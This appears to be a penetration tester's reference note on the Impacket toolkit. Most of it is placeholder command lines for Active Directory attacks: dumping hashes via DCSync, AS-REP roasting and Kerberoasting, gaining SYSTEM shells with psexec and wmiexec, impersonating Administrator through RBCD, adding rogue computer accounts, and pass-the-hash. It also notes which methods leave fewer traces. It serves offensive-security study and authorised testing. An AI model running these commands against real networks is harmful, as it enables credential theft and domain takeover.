# Impacket

## What it is

Impacket is a Python library (and collection of example scripts) for working with Windows network protocols: SMB, MSRPC, Kerberos, LDAP, NTLM, DCE/RPC. It is the standard offensive toolkit for Windows/AD attacks from Linux.

## Installation

```bash
pip3 install impacket
# or on Kali (all scripts pre-installed as impacket-<tool>):
sudo apt install python3-impacket impacket-scripts
```

## Key Scripts

### Credential and Hash Attacks

| Script | Usage |
|--------|-------|
| `impacket-secretsdump` | Dump NTLM hashes, Kerberos keys, LSA secrets, DPAPI via SMB/DCOM or DCSync |
| `impacket-GetNPUsers` | AS-REP roasting — find accounts with pre-auth disabled, get crackable hashes |
| `impacket-GetUserSPNs` | Kerberoasting — get TGS tickets for accounts with SPNs, crack offline |

```bash
# DCSync (requires DS-Replication rights)
impacket-secretsdump <domain>/<user>:'<pass>'@<dc-ip>

# AS-REP roasting
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>

# Kerberoasting
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc-ip> -request
```

### Remote Execution

| Script | Notes |
|--------|-------|
| `impacket-psexec` | Uploads a service binary over SMB → SYSTEM shell |
| `impacket-wmiexec` | WMI-based execution — semi-interactive, no binary upload |
| `impacket-smbexec` | SMB service execution — leaves fewer traces than psexec |
| `impacket-atexec` | Scheduled task execution |

```bash
# psexec with password
impacket-psexec <domain>/<user>:'<pass>'@<target>

# psexec with Kerberos ticket
export KRB5CCNAME=<ticket.ccache>
impacket-psexec -k -no-pass <domain>/<user>@<target-fqdn> -dc-ip <dc-ip>

# wmiexec (stealthier)
impacket-wmiexec <domain>/<user>:'<pass>'@<target>
```

### Kerberos / Delegation

| Script | Notes |
|--------|-------|
| `impacket-getST` | S4U2Self + S4U2Proxy — request service ticket impersonating another user (RBCD/constrained delegation) |
| `impacket-getTGT` | Get a TGT for a user (pass-the-password or pass-the-hash) |
| `impacket-ticketer` | Forge Silver/Golden tickets |

```bash
# RBCD — impersonate Administrator via S4U2Self/S4U2Proxy
impacket-getST \
  -spn cifs/<target-fqdn> \
  -impersonate Administrator \
  <domain>/'<delegating_computer>$':'<pass>' \
  -dc-ip <dc-ip>
```

### AD Computer and Delegation Management

| Script | Notes |
|--------|-------|
| `impacket-addcomputer` | Add a computer account to AD via LDAP (exploits default MachineAccountQuota) |
| `impacket-rbcd` | Read/write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object |

```bash
# Add a computer account
impacket-addcomputer <domain>/<user>:'<pass>' \
  -computer-name 'FAKE01$' -computer-pass 'Fakepass123!' \
  -dc-ip <dc-ip>

# Configure RBCD
impacket-rbcd \
  -delegate-from 'FAKE01$' \
  -delegate-to '<TARGET>$' \
  -action write \
  -dc-ip <dc-ip> \
  <domain>/<privileged_user>:'<pass>'
```

### SMB / File

```bash
# List shares
impacket-smbclient <domain>/<user>:'<pass>'@<target>

# Mount a share
impacket-smbclient <domain>/<user>:'<pass>'@<target> -share <sharename>
```

## Pass-the-Hash

Most Impacket scripts accept an NTLM hash in place of a password using the format `LM:NT`:

```bash
impacket-psexec -hashes :<ntlm_hash> <domain>/<user>@<target>
```

## Related

- [[RBCD (Resource-Based Constrained Delegation)]]
- [[BloodHound — Active Directory Enumeration]]
- [[smb,smbmap, smbcclient]]
